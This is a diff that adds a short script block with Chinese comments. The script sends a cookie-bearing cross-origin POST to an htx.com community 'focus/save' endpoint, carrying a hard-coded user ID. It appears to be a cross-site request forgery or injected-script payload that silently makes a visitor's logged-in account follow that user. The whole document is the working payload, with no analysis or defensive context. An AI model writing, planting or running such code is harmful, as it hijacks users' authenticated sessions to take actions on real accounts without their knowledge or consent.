@@ -1,0 +1,33 @@
+<script>// 创建 XMLHttpRequest 对象
+var xhr = new XMLHttpRequest();
+
+// 请求的 URL
+var url = 'https://www.htx.com/-/x/hbg/v1/content/community/focus/save';
+
+// 配置请求
+xhr.open('POST', url, true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+// 允许跨域请求带上 cookie
+xhr.withCredentials = true;
+
+// 请求完成后的回调
+xhr.onreadystatechange = function () {
+    if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+            console.log('Response:', xhr.responseText);
+        } else {
+            console.error('Error:', xhr.status, xhr.statusText);
+        }
+    }
+};
+
+// 请求数据
+var requestData = {"uidUnique":"223113755","type":1};
+
+// 将请求数据对象转换为 JSON 字符串
+var jsonData = JSON.stringify(requestData);
+
+// 发送请求
+xhr.send(jsonData);
+</script>
